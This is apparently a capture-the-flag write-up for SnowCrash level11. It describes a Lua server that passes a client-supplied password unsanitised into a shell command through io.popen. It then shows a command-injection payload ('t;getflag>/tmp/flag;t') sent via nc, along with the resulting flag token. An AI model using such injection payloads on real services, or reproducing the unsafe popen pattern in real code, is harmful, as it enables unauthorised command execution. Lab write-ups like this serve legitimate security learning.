When login to level11 user we find a lua script. It's server code binding to 127.0.0.1:5151

Infinitly accepting client connection prompting `Password: ` and passes the pass writen by the
client write to `function hash(pass)`

function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()

	data = string.sub(data, 1, 40)

	return data
end

The program does not sanitize what we send so it seems we can inject code
io.popen("echo "t;injected code exec as flag11;t" | sha1sum", "r")

- we'll run getflag and redirect the standard output to /tmp/flag our payload will be
t;getflag > /tmp/flag;t

```
level11@SnowCrash:~$ nc localhost 5151
Password: t;getflag>/tmp/flag;t
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$
```